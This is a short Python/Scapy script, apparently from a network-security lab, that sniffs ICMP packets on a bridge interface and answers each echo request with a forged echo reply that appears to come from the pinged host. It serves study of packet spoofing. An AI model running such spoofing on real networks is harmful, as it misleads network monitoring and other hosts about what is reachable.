from scapy.all import *

def handle_packet(packet):
    # Check if the packet is an ICMP echo request packet
    if packet.haslayer(ICMP) and packet[ICMP].type == 8:
        # Craft a spoofed ICMP echo reply packet
        reply = IP(src=packet[IP].dst, dst=packet[IP].src,ttl=packet[IP].ttl,id=packet[IP].id) / ICMP(type=0,id=packet[ICMP].id,seq=packet[ICMP].seq) / packet[Raw].load
        # Send the spoofed reply
        send(reply)
        print(f"Sent spoofed ICMP echo reply from {packet[IP].dst} to {packet[IP].src}")

def main():
    # Sniff all ICMP packets
    sniff(filter="icmp", prn=handle_packet,iface='br-75e743f0181a')

if __name__ == "__main__":
    main()
